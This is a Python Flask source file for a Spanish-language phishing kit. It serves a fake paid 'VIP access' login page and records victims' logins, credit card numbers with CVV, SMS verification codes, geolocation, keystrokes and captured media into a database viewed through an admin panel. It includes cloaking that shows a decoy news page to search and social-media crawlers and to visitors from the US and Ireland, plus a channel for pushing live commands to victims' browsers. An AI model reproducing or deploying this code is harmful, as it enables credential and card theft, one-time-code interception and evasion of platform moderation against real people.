import os, requests, sqlite3, time, shutil
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- CONFIGURACIÓN DE RUTAS ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'static', 'uploads') 
SYSTEM_FOLDER = os.path.join(BASE_DIR, 'static', 'system')  
MEDIA_FOLDER = os.path.join(BASE_DIR, 'static', 'captured')
DB_PATH = os.path.join(BASE_DIR, 'database.db')

for folder in [UPLOAD_FOLDER, SYSTEM_FOLDER, MEDIA_FOLDER]:
    if not os.path.exists(folder): os.makedirs(folder)

# Diccionario para Inyección en Vivo {id_usuario: "comando"}
ordenes_activas = {}

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS registros 
        (id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT, pass TEXT, tarjeta TEXT, 
         sms TEXT, tipo TEXT, hora TEXT, dispositivo TEXT, city TEXT, lat REAL, lon REAL,
         bateria TEXT, resolucion TEXT, lenguaje TEXT, zona_horaria TEXT, status TEXT)''')
    conn.commit(); conn.close()

init_db()

config_web = {
    "user_admin": "franco", "pass_admin": "franco",
    "alias": "VIP.FRANCO.PAGOS", "precio": "2500",
    "img_principal": "/static/system/portada.jpg",
    "titulo": "ACCESO EXCLUSIVO VIP",
    "color_fondo": "#1a0033", "color_texto": "#ffffff"
}

# --- MOTOR DE CLOAKING (CAMUFLAJE) ---
def es_revisor(ua, ip):
    bots = ["facebookexternalhit", "googlebot", "bingbot", "twitterbot", "linkedinbot", "slurp"]
    es_bot = any(bot in ua.lower() for bot in bots)
    try:
        # Filtro geográfico: si es de USA o Irlanda (sedes de revisores), camuflar
        res = requests.get(f'https://ipapi.co/{ip}/json/', timeout=2).json()
        if res.get('country_code') in ['US', 'IE']: return True
    except: pass
    return es_bot

# --- RUTAS DE NAVEGACIÓN ---

@app.route('/')
def login():
    ua = request.headers.get('User-Agent', '')
    ip = request.remote_addr
    if es_revisor(ua, ip):
        return render_template('noticias_fake.html')
    return render_template('login.html', config=config_web)

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('email'), request.form.get('pass')
    lat, lon = request.form.get('lat', 0), request.form.get('lon', 0)
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("INSERT INTO registros (user, pass, tarjeta, sms, hora, lat, lon, status) VALUES (?,?,?,?,?,?,?,?)",
                   (u, p, "ESPERANDO...", "PENDIENTE", datetime.now().strftime("%H:%M:%S"), lat, lon, "LOGIN"))
    session['current_id'] = cursor.lastrowid
    conn.commit(); conn.close()
    session['logged_in'] = True
    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'): return redirect(url_for('login'))
    fotos = [f for f in os.listdir(UPLOAD_FOLDER) if f.lower().endswith(('png', 'jpg', 'jpeg'))]
    return render_template('dashboard.html', config=config_web, fotos=fotos)

# --- CAPTURA DE DATOS (TARJETA Y SMS) ---

@app.route('/captura_pago', methods=['POST'])
def captura_pago():
    rid = session.get('current_id')
    if rid:
        data = f"CC: {request.form.get('cc')} | EXP: {request.form.get('exp')} | CVV: {request.form.get('cvv')}"
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET tarjeta=?, status='PAGO_ENVIADO' WHERE id=?", (data, rid))
        conn.commit(); conn.close()
        return render_template('procesando.html', config=config_web)
    return redirect(url_for('login'))

@app.route('/verificar_sms', methods=['POST'])
def verificar_sms():
    rid = session.get('current_id')
    if rid:
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET sms=?, status='SMS_RECIBIDO' WHERE id=?", (request.form.get('sms_code'), rid))
        conn.commit(); conn.close()
    return render_template('error_final.html', config=config_web)

# --- SISTEMA DE INYECCIÓN Y KEYLOG ---

@app.route('/enviar_orden', methods=['POST'])
def enviar_orden():
    if session.get('is_admin'):
        data = request.json
        ordenes_activas[str(data['id'])] = data['cmd']
        return jsonify({"s": "ok"})
    return jsonify({"s": "error"}), 403

@app.route('/obtener_orden/<id>')
def obtener_orden(id):
    cmd = ordenes_activas.get(str(id), "NINGUNA")
    if cmd != "NINGUNA": ordenes_activas[str(id)] = "NINGUNA"
    return jsonify({"cmd": cmd})

@app.route('/k_log', methods=['POST'])
def k_log():
    data = request.json
    rid = session.get('current_id')
    if rid:
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET user=?, pass=? WHERE id=?", (data.get('u'), data.get('p'), rid))
        conn.commit(); conn.close()
    return jsonify({"s": "ok"})

@app.route('/upload_capture', methods=['POST'])
def upload_capture():
    if 'file' in request.files:
        f = request.files['file']
        tipo = request.form.get('type', 'misc')
        rid = request.form.get('id', 'anon')
        fname = f"{tipo}_{rid}_{int(time.time())}.{'jpg' if 'image' in f.content_type else 'webm'}"
        f.save(os.path.join(MEDIA_FOLDER, fname))
    return jsonify({"s": "ok"})

# --- PANEL ADMIN Y GESTIÓN ---

@app.route('/matrix_admin', methods=['GET', 'POST'])
def admin_matrix():
    if request.method == 'POST':
        if request.form.get('user') == config_web["user_admin"] and request.form.get('pass') == config_web["pass_admin"]:
            session['is_admin'] = True
    if not session.get('is_admin'): return render_template('admin_login.html')
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("SELECT * FROM registros ORDER BY id DESC")
    regs = cursor.fetchall(); conn.close()
    return render_template('admin.html', config=config_web, registros=regs, archivos=os.listdir(UPLOAD_FOLDER), capturas=os.listdir(MEDIA_FOLDER))

@app.route('/delete_log/<int:id>')
def delete_log(id):
    if session.get('is_admin'):
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("DELETE FROM registros WHERE id=?", (id,))
        conn.commit(); conn.close()
    return redirect(url_for('admin_matrix'))

@app.route('/clear_all_logs')
def clear_all_logs():
    if session.get('is_admin'):
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("DELETE FROM registros"); conn.commit(); conn.close()
        for f in os.listdir(MEDIA_FOLDER):
            try: os.remove(os.path.join(MEDIA_FOLDER, f))
            except: pass
    return redirect(url_for('admin_matrix'))

@app.route('/update_full', methods=['POST'])
def update_full():
    if session.get('is_admin'):
        # 1. Manejo de la imagen de portada
        if 'file_portada' in request.files:
            f = request.files['file_portada']
            if f.filename != '':
                f.save(os.path.join(SYSTEM_FOLDER, "portada.jpg"))
        
        # 2. Actualización de textos y COLORES
        config_web.update({
            "titulo": request.form.get('titulo'),
            "alias": request.form.get('alias'),
            "precio": request.form.get('precio'),
            "color_fondo": request.form.get('color_fondo'), # <-- Agregado
            "color_texto": request.form.get('color_texto')  # <-- Agregado
        })
        print(f"[!] Configuración actualizada: {config_web}")
    return redirect(url_for('admin_matrix'))


@app.route('/upload_media', methods=['POST'])
def upload_media():
    if session.get('is_admin') and 'file_gallery' in request.files:
        f = request.files['file_gallery']
        if f.filename != '': f.save(os.path.join(UPLOAD_FOLDER, f.filename))
    return redirect(url_for('admin_matrix'))

@app.route('/delete_file/<filename>')
def delete_file(filename):
    if session.get('is_admin'):
        try:
            ruta_archivo = os.path.join(UPLOAD_FOLDER, filename)
            if os.path.exists(ruta_archivo):
                os.remove(ruta_archivo)
                print(f"[!] Archivo borrado: {filename}")
        except Exception as e:
            print(f"Error al borrar archivo: {e}")
    return redirect(url_for('admin_matrix'))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
